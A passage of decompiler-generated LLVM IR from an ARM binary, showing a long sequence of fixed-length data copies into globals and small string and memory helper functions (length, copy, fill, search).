  %v0_11e40 = call i32 @function_13c7c()
  store i32 %v0_11e40, i32* @r5, align 4
  %v3_11e50 = call i32 @function_12394(i32 %v0_11e40, i32 ptrtoint (i32* @global_var_19b30.433 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  %v0_11e5c = load i32, i32* @r5, align 4
  store i32 %v0_11e5c, i32* @global_var_229f8.434, align 4
  store i16 19, i16* bitcast (i32* @global_var_229fc.435 to i16*), align 4
  %v0_11e64 = call i32 @function_13c7c()
  store i32 %v0_11e64, i32* @r5, align 4
  %v3_11e74 = call i32 @function_12394(i32 %v0_11e64, i32 ptrtoint (i32* @global_var_19b44.437 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_22a04.438 to i16*), align 4
  %v0_11e84 = load i32, i32* @r5, align 4
  store i32 %v0_11e84, i32* @global_var_22a00.439, align 4
  %v0_11e88 = call i32 @function_13c7c()
  %v0_11e94 = load i32, i32* @r6, align 4
  %v1_11e94 = add i32 %v0_11e94, 2
  store i32 %v1_11e94, i32* @r6, align 4
  store i32 %v0_11e88, i32* @r5, align 4
  %v4_11e9c = call i32 @function_12394(i32 %v0_11e88, i32 ptrtoint ([10 x i8]* @global_var_19b60.441 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  %v0_11ea4 = load i32, i32* @r5, align 4
  store i32 %v0_11ea4, i32* @global_var_22a08.442, align 4
  %v0_11ea8 = load i32, i32* @r6, align 4
  %v1_11ea8 = trunc i32 %v0_11ea8 to i16
  store i16 %v1_11ea8, i16* bitcast (i32* @global_var_22a0c.443 to i16*), align 4
  %v0_11eac = call i32 @function_13c7c()
  store i32 %v0_11eac, i32* @r5, align 4
  store i32 16, i32* @sb, align 4
  %v3_11ec0 = call i32 @function_12394(i32 %v0_11eac, i32 ptrtoint (i32* @global_var_19b6c.445 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_11ec8 = load i32, i32* @r5, align 4
  store i32 %v0_11ec8, i32* @global_var_22a10.446, align 4
  %v0_11ecc = load i32, i32* @sb, align 4
  %v1_11ecc = trunc i32 %v0_11ecc to i16
  store i16 %v1_11ecc, i16* bitcast (i32* @global_var_22a14.447 to i16*), align 4
  %v0_11ed0 = call i32 @function_13c7c()
  store i32 %v0_11ed0, i32* @r5, align 4
  %v3_11ee0 = call i32 @function_12394(i32 %v0_11ed0, i32 ptrtoint (i32* @global_var_19b80.449 to i32), i32 22)
  store i32 21, i32* @r0, align 4
  %v0_11eec = load i32, i32* @r5, align 4
  store i32 %v0_11eec, i32* @global_var_22a18.450, align 4
  store i16 22, i16* bitcast (i32* @global_var_22a1c.451 to i16*), align 4
  %v0_11ef4 = call i32 @function_13c7c()
  store i32 %v0_11ef4, i32* @r5, align 4
  %v3_11f04 = call i32 @function_12394(i32 %v0_11ef4, i32 ptrtoint (i32* @global_var_19b98.453 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_22a24.454 to i16*), align 4
  %v0_11f14 = load i32, i32* @r5, align 4
  store i32 %v0_11f14, i32* @global_var_22a20.455, align 4
  %v0_11f18 = call i32 @function_13c7c()
  store i32 %v0_11f18, i32* @r5, align 4
  %v4_11f28 = call i32 @function_12394(i32 %v0_11f18, i32 ptrtoint ([18 x i8]* @global_var_19bb0.457 to i32), i32 17)
  %v0_11f30 = load i32, i32* @r7, align 4
  store i32 %v0_11f30, i32* @r0, align 4
  %v0_11f34 = load i32, i32* @r5, align 4
  store i32 %v0_11f34, i32* @global_var_22a28.458, align 4
  store i16 17, i16* bitcast (i32* @global_var_22a2c.459 to i16*), align 4
  %v0_11f3c = call i32 @function_13c7c()
  %v0_11f44 = load i32, i32* @r7, align 4
  store i32 %v0_11f3c, i32* @r5, align 4
  %v3_11f4c = call i32 @function_12394(i32 %v0_11f3c, i32 ptrtoint (i32* @global_var_19bc4.461 to i32), i32 %v0_11f44)
  store i32 23, i32* @r0, align 4
  %v0_11f54 = load i32, i32* @r5, align 4
  store i32 %v0_11f54, i32* @global_var_22a30.462, align 4
  %v0_11f58 = load i32, i32* @r7, align 4
  %v1_11f58 = trunc i32 %v0_11f58 to i16
  store i16 %v1_11f58, i16* bitcast (i32* @global_var_22a34.463 to i16*), align 4
  %v0_11f5c = call i32 @function_13c7c()
  store i32 %v0_11f5c, i32* @r5, align 4
  %v3_11f6c = call i32 @function_12394(i32 %v0_11f5c, i32 ptrtoint (i32* @global_var_19bd4.465 to i32), i32 23)
  store i32 83, i32* @r0, align 4
  %v2_11f7c = load i32, i32* @r4, align 4
  %v4_11f7c = add i32 %v2_11f7c, 260
  %v5_11f7c = inttoptr i32 %v4_11f7c to i16*
  store i16 23, i16* %v5_11f7c, align 2
  %v0_11f80 = load i32, i32* @r5, align 4
  store i32 %v0_11f80, i32* @global_var_22a38.466, align 4
  %v0_11f84 = call i32 @function_13c7c()
  store i32 %v0_11f84, i32* @r5, align 4
  %v3_11f94 = call i32 @function_12394(i32 %v0_11f84, i32 ptrtoint (i32* @global_var_19bec.468 to i32), i32 83)
  store i32 32, i32* @r0, align 4
  %v2_11fa4 = load i32, i32* @r4, align 4
  %v4_11fa4 = add i32 %v2_11fa4, 268
  %v5_11fa4 = inttoptr i32 %v4_11fa4 to i16*
  store i16 83, i16* %v5_11fa4, align 2
  %v0_11fa8 = load i32, i32* @r5, align 4
  store i32 %v0_11fa8, i32* @global_var_22a40.469, align 4
  %v0_11fac = call i32 @function_13c7c()
  store i32 %v0_11fac, i32* @r5, align 4
  %v3_11fbc = call i32 @function_12394(i32 %v0_11fac, i32 ptrtoint (i32* @global_var_19c40.471 to i32), i32 32)
  store i32 48, i32* @r0, align 4
  %v2_11fcc = load i32, i32* @r4, align 4
  %v4_11fcc = add i32 %v2_11fcc, 276
  %v5_11fcc = inttoptr i32 %v4_11fcc to i16*
  store i16 32, i16* %v5_11fcc, align 2
  %v0_11fd0 = load i32, i32* @r5, align 4
  store i32 %v0_11fd0, i32* @global_var_22a48.472, align 4
  %v0_11fd4 = call i32 @function_13c7c()
  store i32 %v0_11fd4, i32* @r5, align 4
  %v3_11fe4 = call i32 @function_12394(i32 %v0_11fd4, i32 ptrtoint (i32* @global_var_19c64.474 to i32), i32 48)
  %v0_11ff0 = load i32, i32* @r7, align 4
  store i32 %v0_11ff0, i32* @r0, align 4
  %v2_11ff4 = load i32, i32* @r4, align 4
  %v4_11ff4 = add i32 %v2_11ff4, 284
  %v5_11ff4 = inttoptr i32 %v4_11ff4 to i16*
  store i16 48, i16* %v5_11ff4, align 2
  %v0_11ff8 = load i32, i32* @r5, align 4
  store i32 %v0_11ff8, i32* @global_var_22a50.475, align 4
  %v0_11ffc = call i32 @function_13c7c()
  %v0_12004 = load i32, i32* @r7, align 4
  store i32 %v0_11ffc, i32* @r5, align 4
  %v3_1200c = call i32 @function_12394(i32 %v0_11ffc, i32 ptrtoint (i32* @global_var_19c98.477 to i32), i32 %v0_12004)
  %v0_12014 = load i32, i32* @r6, align 4
  store i32 %v0_12014, i32* @r0, align 4
  %v0_12018 = load i32, i32* @r7, align 4
  %v1_12018 = trunc i32 %v0_12018 to i16
  %v2_12018 = load i32, i32* @r4, align 4
  %v4_12018 = add i32 %v2_12018, 292
  %v5_12018 = inttoptr i32 %v4_12018 to i16*
  store i16 %v1_12018, i16* %v5_12018, align 2
  %v0_1201c = load i32, i32* @r5, align 4
  store i32 %v0_1201c, i32* @global_var_22a58.478, align 4
  %v0_12020 = call i32 @function_13c7c()
  %v0_12024 = load i32, i32* @r6, align 4
  store i32 %v0_12020, i32* @r5, align 4
  %v3_12030 = call i32 @function_12394(i32 %v0_12020, i32 ptrtoint (i32* @global_var_19ca8.480 to i32), i32 %v0_12024)
  %v0_12038 = load i32, i32* @r8, align 4
  store i32 %v0_12038, i32* @r0, align 4
  %v0_1203c = load i32, i32* @r6, align 4
  %v1_1203c = trunc i32 %v0_1203c to i16
  %v2_1203c = load i32, i32* @r4, align 4
  %v4_1203c = add i32 %v2_1203c, 300
  %v5_1203c = inttoptr i32 %v4_1203c to i16*
  store i16 %v1_1203c, i16* %v5_1203c, align 2
  %v0_12040 = load i32, i32* @r5, align 4
  store i32 %v0_12040, i32* @global_var_22a60.481, align 4
  %v0_12044 = call i32 @function_13c7c()
  %v0_1204c = load i32, i32* @r8, align 4
  store i32 %v0_12044, i32* @r5, align 4
  %v3_12054 = call i32 @function_12394(i32 %v0_12044, i32 ptrtoint (i32* @global_var_19cb4.483 to i32), i32 %v0_1204c)
  %v0_1205c = load i32, i32* @r7, align 4
  store i32 %v0_1205c, i32* @r0, align 4
  %v0_12060 = load i32, i32* @r8, align 4
  %v1_12060 = trunc i32 %v0_12060 to i16
  %v2_12060 = load i32, i32* @r4, align 4
  %v4_12060 = add i32 %v2_12060, 308
  %v5_12060 = inttoptr i32 %v4_12060 to i16*
  store i16 %v1_12060, i16* %v5_12060, align 2
  %v0_12064 = load i32, i32* @r5, align 4
  store i32 %v0_12064, i32* @global_var_22a68.484, align 4
  %v0_12068 = call i32 @function_13c7c()
  %v0_12070 = load i32, i32* @r7, align 4
  store i32 %v0_12068, i32* @r5, align 4
  %v3_12078 = call i32 @function_12394(i32 %v0_12068, i32 ptrtoint (i32* @global_var_19cc0.486 to i32), i32 %v0_12070)
  %v0_12080 = load i32, i32* @sb, align 4
  store i32 %v0_12080, i32* @r0, align 4
  %v0_12084 = load i32, i32* @r7, align 4
  %v1_12084 = trunc i32 %v0_12084 to i16
  %v2_12084 = load i32, i32* @r4, align 4
  %v4_12084 = add i32 %v2_12084, 316
  %v5_12084 = inttoptr i32 %v4_12084 to i16*
  store i16 %v1_12084, i16* %v5_12084, align 2
  %v0_12088 = load i32, i32* @r5, align 4
  store i32 %v0_12088, i32* @global_var_22a70.487, align 4
  %v0_1208c = call i32 @function_13c7c()
  %v0_12094 = load i32, i32* @sb, align 4
  store i32 %v0_1208c, i32* @r5, align 4
  %v3_1209c = call i32 @function_12394(i32 %v0_1208c, i32 ptrtoint (i32* @global_var_19cd0.489 to i32), i32 %v0_12094)
  store i32 19, i32* @r0, align 4
  %v0_120a8 = load i32, i32* @sb, align 4
  %v1_120a8 = trunc i32 %v0_120a8 to i16
  %v2_120a8 = load i32, i32* @r4, align 4
  %v4_120a8 = add i32 %v2_120a8, 324
  %v5_120a8 = inttoptr i32 %v4_120a8 to i16*
  store i16 %v1_120a8, i16* %v5_120a8, align 2
  %v0_120ac = load i32, i32* @r5, align 4
  store i32 %v0_120ac, i32* @global_var_22a78.490, align 4
  %v0_120b0 = call i32 @function_13c7c()
  store i32 %v0_120b0, i32* @r5, align 4
  %v3_120c0 = call i32 @function_12394(i32 %v0_120b0, i32 ptrtoint (i32* @global_var_19ce4.492 to i32), i32 19)
  %v0_120cc = load i32, i32* @sl, align 4
  store i32 %v0_120cc, i32* @r0, align 4
  %v2_120d0 = load i32, i32* @r4, align 4
  %v4_120d0 = add i32 %v2_120d0, 332
  %v5_120d0 = inttoptr i32 %v4_120d0 to i16*
  store i16 19, i16* %v5_120d0, align 2
  %v0_120d4 = load i32, i32* @r5, align 4
  store i32 %v0_120d4, i32* @global_var_22a80.493, align 4
  %v0_120d8 = call i32 @function_13c7c()
  %v0_120e0 = load i32, i32* @sl, align 4
  store i32 %v0_120d8, i32* @r5, align 4
  %v4_120e8 = call i32 @function_12394(i32 %v0_120d8, i32 ptrtoint ([9 x i8]* @global_var_19cf8.495 to i32), i32 %v0_120e0)
  %v0_120f0 = load i32, i32* @fp, align 4
  store i32 %v0_120f0, i32* @r0, align 4
  %v0_120f4 = load i32, i32* @sl, align 4
  %v1_120f4 = trunc i32 %v0_120f4 to i16
  %v2_120f4 = load i32, i32* @r4, align 4
  %v4_120f4 = add i32 %v2_120f4, 340
  %v5_120f4 = inttoptr i32 %v4_120f4 to i16*
  store i16 %v1_120f4, i16* %v5_120f4, align 2
  %v0_120f8 = load i32, i32* @r5, align 4
  store i32 %v0_120f8, i32* @global_var_22a88.496, align 4
  %v0_120fc = call i32 @function_13c7c()
  %v0_12104 = load i32, i32* @fp, align 4
  store i32 %v0_120fc, i32* @r5, align 4
  %v3_1210c = call i32 @function_12394(i32 %v0_120fc, i32 ptrtoint (i32* @global_var_19be0.498 to i32), i32 %v0_12104)
  %v0_12114 = load i32, i32* @r7, align 4
  store i32 %v0_12114, i32* @r0, align 4
  %v0_12118 = load i32, i32* @fp, align 4
  %v1_12118 = trunc i32 %v0_12118 to i16
  %v2_12118 = load i32, i32* @r4, align 4
  %v4_12118 = add i32 %v2_12118, 348
  %v5_12118 = inttoptr i32 %v4_12118 to i16*
  store i16 %v1_12118, i16* %v5_12118, align 2
  %v0_1211c = load i32, i32* @r5, align 4
  store i32 %v0_1211c, i32* @global_var_22a90.499, align 4
  %v0_12120 = call i32 @function_13c7c()
  %v0_12128 = load i32, i32* @r7, align 4
  store i32 %v0_12120, i32* @r5, align 4
  %v3_12130 = call i32 @function_12394(i32 %v0_12120, i32 ptrtoint (i32* @global_var_19d04.501 to i32), i32 %v0_12128)
  store i32 18, i32* @r0, align 4
  %v0_1213c = load i32, i32* @r7, align 4
  %v1_1213c = trunc i32 %v0_1213c to i16
  %v2_1213c = load i32, i32* @r4, align 4
  %v4_1213c = add i32 %v2_1213c, 356
  %v5_1213c = inttoptr i32 %v4_1213c to i16*
  store i16 %v1_1213c, i16* %v5_1213c, align 2
  %v0_12140 = load i32, i32* @r5, align 4
  store i32 %v0_12140, i32* @global_var_22a98.502, align 4
  %v0_12144 = call i32 @function_13c7c()
  store i32 %v0_12144, i32* @r5, align 4
  %v3_12154 = call i32 @function_12394(i32 %v0_12144, i32 ptrtoint (i32* @global_var_19d14.504 to i32), i32 18)
  store i32 25, i32* @r0, align 4
  %v2_12164 = load i32, i32* @r4, align 4
  %v4_12164 = add i32 %v2_12164, 364
  %v5_12164 = inttoptr i32 %v4_12164 to i16*
  store i16 18, i16* %v5_12164, align 2
  %v0_12168 = load i32, i32* @r5, align 4
  store i32 %v0_12168, i32* @global_var_22aa0.505, align 4
  %v0_1216c = call i32 @function_13c7c()
  store i32 %v0_1216c, i32* %r5.global-to-local, align 4
  %v3_1217c = call i32 @function_12394(i32 %v0_1216c, i32 ptrtoint (i32* @global_var_19d28.507 to i32), i32 25)
  store i32 111, i32* @r0, align 4
  %v2_1218c = load i32, i32* @r4, align 4
  %v4_1218c = add i32 %v2_1218c, 372
  %v5_1218c = inttoptr i32 %v4_1218c to i16*
  store i16 25, i16* %v5_1218c, align 2
  %v0_12190 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12190, i32* @global_var_22aa8.508, align 4
  %v0_12194 = load i32, i32* @r0, align 4
  store i32 %v0_12194, i32* @r5, align 4
  %v0_12198 = call i32 @function_13c7c()
  %v0_1219c = load i32, i32* @r5, align 4
  store i32 %v0_12198, i32* @r6, align 4
  %v3_121a8 = call i32 @function_12394(i32 %v0_12198, i32 ptrtoint (i32* @global_var_19d44.510 to i32), i32 %v0_1219c)
  %v0_121b0 = load i32, i32* @r5, align 4
  store i32 %v0_121b0, i32* @r0, align 4
  %v1_121b4 = trunc i32 %v0_121b0 to i16
  %v2_121b4 = load i32, i32* @r4, align 4
  %v4_121b4 = add i32 %v2_121b4, 380
  %v5_121b4 = inttoptr i32 %v4_121b4 to i16*
  store i16 %v1_121b4, i16* %v5_121b4, align 2
  %v0_121b8 = load i32, i32* @r6, align 4
  store i32 %v0_121b8, i32* @global_var_22ab0.511, align 4
  %v0_121bc = call i32 @function_13c7c()
  %v0_121c0 = load i32, i32* @r5, align 4
  store i32 %v0_121bc, i32* @r6, align 4
  %v3_121cc = call i32 @function_12394(i32 %v0_121bc, i32 ptrtoint (i32* @global_var_19db4.513 to i32), i32 %v0_121c0)
  store i32 110, i32* @r0, align 4
  %v0_121d8 = load i32, i32* @r5, align 4
  %v1_121d8 = trunc i32 %v0_121d8 to i16
  %v2_121d8 = load i32, i32* @r4, align 4
  %v4_121d8 = add i32 %v2_121d8, 388
  %v5_121d8 = inttoptr i32 %v4_121d8 to i16*
  store i16 %v1_121d8, i16* %v5_121d8, align 2
  %v0_121dc = load i32, i32* @r6, align 4
  store i32 %v0_121dc, i32* @global_var_22ab8.514, align 4
  %v0_121e0 = load i32, i32* @r0, align 4
  store i32 %v0_121e0, i32* @r5, align 4
  %v0_121e4 = call i32 @function_13c7c()
  %v0_121e8 = load i32, i32* @r5, align 4
  store i32 %v0_121e4, i32* @r6, align 4
  %v3_121f4 = call i32 @function_12394(i32 %v0_121e4, i32 ptrtoint (i32* @global_var_19e24.516 to i32), i32 %v0_121e8)
  %v0_121fc = load i32, i32* @r5, align 4
  store i32 %v0_121fc, i32* @r0, align 4
  %v1_12200 = trunc i32 %v0_121fc to i16
  %v2_12200 = load i32, i32* @r4, align 4
  %v4_12200 = add i32 %v2_12200, 396
  %v5_12200 = inttoptr i32 %v4_12200 to i16*
  store i16 %v1_12200, i16* %v5_12200, align 2
  %v0_12204 = load i32, i32* @r6, align 4
  store i32 %v0_12204, i32* @global_var_22ac0.517, align 4
  %v0_12208 = call i32 @function_13c7c()
  %v0_1220c = load i32, i32* @r5, align 4
  store i32 %v0_12208, i32* @r6, align 4
  %v3_12218 = call i32 @function_12394(i32 %v0_12208, i32 ptrtoint (i32* @global_var_19e94.519 to i32), i32 %v0_1220c)
  store i32 117, i32* @r0, align 4
  %v0_12224 = load i32, i32* @r5, align 4
  %v1_12224 = trunc i32 %v0_12224 to i16
  %v2_12224 = load i32, i32* @r4, align 4
  %v4_12224 = add i32 %v2_12224, 404
  %v5_12224 = inttoptr i32 %v4_12224 to i16*
  store i16 %v1_12224, i16* %v5_12224, align 2
  %v0_12228 = load i32, i32* @r6, align 4
  store i32 %v0_12228, i32* @global_var_22ac8.520, align 4
  %v0_1222c = call i32 @function_13c7c()
  store i32 %v0_1222c, i32* %r5.global-to-local, align 4
  %v3_1223c = call i32 @function_12394(i32 %v0_1222c, i32 ptrtoint (i32* @global_var_19f04.522 to i32), i32 117)
  store i32 %v0_1222c, i32* @global_var_22ad0.523, align 4
  %v2_1224c = load i32, i32* @r4, align 4
  %v4_1224c = add i32 %v2_1224c, 412
  %v5_1224c = inttoptr i32 %v4_1224c to i16*
  store i16 117, i16* %v5_1224c, align 2
  store i32 %v6_11b34, i32* %r5.global-to-local, align 4
  ret i32 %v3_1223c

; uselistorder directives
  uselistorder i32 %v0_12208, { 1, 0 }
  uselistorder i32 %v0_121e4, { 1, 0 }
  uselistorder i32 %v0_121bc, { 1, 0 }
  uselistorder i32 %v0_12198, { 1, 0 }
  uselistorder i32 %v0_12120, { 1, 0 }
  uselistorder i32 %v0_120fc, { 1, 0 }
  uselistorder i32 %v0_120d8, { 1, 0 }
  uselistorder i32 %v0_1208c, { 1, 0 }
  uselistorder i32 %v0_12068, { 1, 0 }
  uselistorder i32 %v0_12044, { 1, 0 }
  uselistorder i32 %v0_12020, { 1, 0 }
  uselistorder i32 %v0_11ffc, { 1, 0 }
  uselistorder i32 %v0_11f3c, { 1, 0 }
  uselistorder i32 %v0_11e88, { 1, 0 }
  uselistorder i32 %v0_11dfc, { 1, 0 }
  uselistorder i32 %v0_11ddc, { 1, 0 }
  uselistorder i32 %v0_11d98, { 1, 0 }
  uselistorder i32 %v0_11d78, { 1, 0 }
  uselistorder i32 %v0_11d34, { 1, 0 }
  uselistorder i32 %v0_11d14, { 1, 0 }
  uselistorder i32 %v0_11cc8, { 1, 0 }
  uselistorder i32 %v0_11ca8, { 1, 0 }
  uselistorder i32 %v0_11c60, { 1, 0 }
  uselistorder i32 %v0_11c18, { 1, 0 }
  uselistorder i32 %v0_11bb0, { 1, 0 }
  uselistorder i32 %v0_11b90, { 1, 0 }
  uselistorder i32 %v0_11b6c, { 1, 0 }
  uselistorder i32 %v0_11b40, { 1, 0 }
  uselistorder i32 18, { 1, 10, 2, 11, 3, 12, 4, 13, 9, 5, 0, 14, 6, 15, 7, 16, 8, 17 }
  uselistorder i32 284, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32 17, { 1, 8, 18, 9, 10, 2, 3, 11, 4, 12, 5, 6, 13, 7, 14, 0, 15, 16, 17 }
  uselistorder i32 21, { 1, 6, 2, 7, 3, 8, 4, 9, 10, 5, 0, 11 }
  uselistorder i32 19, { 2, 7, 3, 8, 4, 9, 5, 10, 6, 11, 17, 12, 13, 14, 0, 15, 1, 16 }
  uselistorder i32 13, { 2, 9, 11, 12, 10, 40, 0, 3, 4, 5, 6, 13, 14, 15, 16, 17, 18, 7, 19, 20, 21, 22, 23, 24, 25, 26, 27, 8, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 38, 39 }
  uselistorder i32 11, { 1, 7, 8, 12, 13, 14, 15, 16, 2, 3, 9, 4, 10, 0, 11, 17, 5, 18, 19, 20, 6, 21, 22, 23 }
  uselistorder i32 29, { 0, 5, 6, 3, 1, 2, 4 }
  uselistorder i32 (i32, i32, i32)* @function_12394, { 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 2, 1, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_22938.339 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @function_12324(i8* %arg1) local_unnamed_addr {
dec_label_pc_12324:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_12328 = load i8, i8* %arg1, align 1
  %v2_1232c = icmp eq i8 %v3_12328, 0
  %v0_12330 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1232c, i32 %v0_12330)
  br label %dec_label_pc_12338

dec_label_pc_12338:                               ; preds = %dec_label_pc_12338, %dec_label_pc_12324
  %v0_12338 = phi i32 [ %v1_12338, %dec_label_pc_12338 ], [ 0, %dec_label_pc_12324 ]
  %v1_12338 = add i32 %v0_12338, 1
  %v2_1233c = add i32 %v1_12338, %tmp
  %v3_1233c = inttoptr i32 %v2_1233c to i8*
  %v4_1233c = load i8, i8* %v3_1233c, align 1
  %v6_1233c = zext i8 %v4_1233c to i32
  store i32 %v6_1233c, i32* @r3, align 4
  %v2_12340 = icmp eq i8 %v4_1233c, 0
  br i1 %v2_12340, label %dec_label_pc_12348, label %dec_label_pc_12338

dec_label_pc_12348:                               ; preds = %dec_label_pc_12338
  ret i32 %v1_12338
}

define i32 @function_1234c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1234c:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_1234c = load i8, i8* %arg1, align 1
  %v3_1234c = zext i8 %v2_1234c to i32
  store i32 %v3_1234c, i32* @r2, align 4
  %v2_12350 = icmp eq i8 %v2_1234c, 0
  br i1 %v2_12350, label %bb, label %dec_label_pc_1235c

bb:                                               ; preds = %dec_label_pc_1234c
  store i32 %v3_1234c, i32* @ip, align 4
  br label %dec_label_pc_12370

dec_label_pc_1235c:                               ; preds = %dec_label_pc_1234c
  br label %dec_label_pc_12360

dec_label_pc_12360:                               ; preds = %dec_label_pc_12360, %dec_label_pc_1235c
  %v0_12360 = phi i32 [ %v1_12360, %dec_label_pc_12360 ], [ 0, %dec_label_pc_1235c ]
  %v1_12360 = add i32 %v0_12360, 1
  store i32 %v1_12360, i32* @ip, align 4
  %v2_12364 = add i32 %v1_12360, %tmp
  %v3_12364 = inttoptr i32 %v2_12364 to i8*
  %v4_12364 = load i8, i8* %v3_12364, align 1
  %v2_12368 = icmp eq i8 %v4_12364, 0
  br i1 %v2_12368, label %dec_label_pc_12370, label %dec_label_pc_12360

dec_label_pc_12370:                               ; preds = %dec_label_pc_12360, %bb
  %v0_12370 = phi i32 [ %v3_1234c, %bb ], [ %v1_12360, %dec_label_pc_12360 ]
  br label %dec_label_pc_1237c

dec_label_pc_12378:                               ; preds = %dec_label_pc_1237c
  %v0_12378 = load i32, i32* %r1.global-to-local, align 4
  %v1_12378 = add i32 %v0_12378, 1
  %v2_12378 = inttoptr i32 %v1_12378 to i8*
  %v3_12378 = load i8, i8* %v2_12378, align 1
  %v4_12378 = zext i8 %v3_12378 to i32
  store i32 %v4_12378, i32* @r2, align 4
  store i32 %v1_12378, i32* %r1.global-to-local, align 4
  %v0_1237c.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_1237c

dec_label_pc_1237c:                               ; preds = %dec_label_pc_12370, %dec_label_pc_12378
  %v0_12384.off0 = phi i8 [ %v2_1234c, %dec_label_pc_12370 ], [ %v3_12378, %dec_label_pc_12378 ]
  %v0_1237c = phi i32 [ %v0_12370, %dec_label_pc_12370 ], [ %v0_1237c.pr, %dec_label_pc_12378 ]
  %v1_1237c = add i32 %v0_1237c, -1
  store i32 %v1_1237c, i32* @r3, align 4
  %v3_12380 = icmp eq i32 %v0_1237c, 0
  %v2_12384 = load i32, i32* @r0, align 4
  %v3_12384 = inttoptr i32 %v2_12384 to i8*
  store i8 %v0_12384.off0, i8* %v3_12384, align 1
  %v4_12384 = load i32, i32* @r0, align 4
  %v5_12384 = add i32 %v4_12384, 1
  store i32 %v5_12384, i32* @r0, align 4
  br i1 %v3_12380, label %dec_label_pc_1238c, label %dec_label_pc_12378

dec_label_pc_1238c:                               ; preds = %dec_label_pc_1237c
  %v0_1238c = load i32, i32* @ip, align 4
  ret i32 %v0_1238c

; uselistorder directives
  uselistorder i32 %v0_1237c, { 1, 0 }
  uselistorder i32 %v1_12360, { 0, 1, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1237c, { 1, 0 }
}

define i32 @function_12394(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12394:
  %ip.global-to-local = alloca i32, align 4
  %v2_12394 = icmp eq i32 %arg3, 0
  %v0_12398 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12394, i32 %v0_12398)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_123a0

dec_label_pc_123a0:                               ; preds = %dec_label_pc_123a0, %dec_label_pc_12394
  %v0_123a0 = phi i32 [ %v1_123a8, %dec_label_pc_123a0 ], [ 0, %dec_label_pc_12394 ]
  %v2_123a0 = add i32 %v0_123a0, %arg2
  %v3_123a0 = inttoptr i32 %v2_123a0 to i8*
  %v4_123a0 = load i8, i8* %v3_123a0, align 1
  %v4_123a4 = add i32 %v0_123a0, %arg1
  %v5_123a4 = inttoptr i32 %v4_123a4 to i8*
  store i8 %v4_123a0, i8* %v5_123a4, align 1
  %v0_123a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_123a8 = add i32 %v0_123a8, 1
  store i32 %v1_123a8, i32* %ip.global-to-local, align 4
  %v9_123ac = icmp eq i32 %v1_123a8, %arg3
  br i1 %v9_123ac, label %dec_label_pc_123b4, label %dec_label_pc_123a0

dec_label_pc_123b4:                               ; preds = %dec_label_pc_123a0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_123a8, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_123b8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_123b8:
  %r2.global-to-local = alloca i32, align 4
  %v2_123b8 = icmp eq i32 %arg2, 0
  %v0_123bc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_123b8, i32 %v0_123bc)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_123c4

dec_label_pc_123c4:                               ; preds = %dec_label_pc_123c4, %dec_label_pc_123b8
  %v2_123c8 = phi i32 [ %v1_123cc, %dec_label_pc_123c4 ], [ 0, %dec_label_pc_123b8 ]
  store i32 0, i32* @r3, align 4
  %v4_123c8 = add i32 %v2_123c8, %arg1
  %v5_123c8 = inttoptr i32 %v4_123c8 to i8*
  store i8 0, i8* %v5_123c8, align 1
  %v0_123cc = load i32, i32* %r2.global-to-local, align 4
  %v1_123cc = add i32 %v0_123cc, 1
  store i32 %v1_123cc, i32* %r2.global-to-local, align 4
  %v9_123d0 = icmp eq i32 %v1_123cc, %arg2
  br i1 %v9_123d0, label %dec_label_pc_123d8, label %dec_label_pc_123c4

dec_label_pc_123d8:                               ; preds = %dec_label_pc_123c4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_123cc, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_123dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_123dc:
  %v7_123f0 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_123f0, label %dec_label_pc_123f8, label %dec_label_pc_12400

dec_label_pc_123f8:                               ; preds = %dec_label_pc_12414, %dec_label_pc_12400, %dec_label_pc_123dc, %dec_label_pc_12440
  %storemerge = phi i32 [ %v1_12440, %dec_label_pc_12440 ], [ -1, %dec_label_pc_123dc ], [ -1, %dec_label_pc_12400 ], [ -1, %dec_label_pc_12414 ]
  ret i32 %storemerge

dec_label_pc_12400:                               ; preds = %dec_label_pc_123dc
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_123f8, label %dec_label_pc_12408

dec_label_pc_12408:                               ; preds = %dec_label_pc_12400
  br label %dec_label_pc_12420

dec_label_pc_12414:                               ; preds = %bb, %dec_label_pc_12434
  %v1_124203 = phi i32 [ %v1_12434, %dec_label_pc_12434 ], [ 0, %bb ]
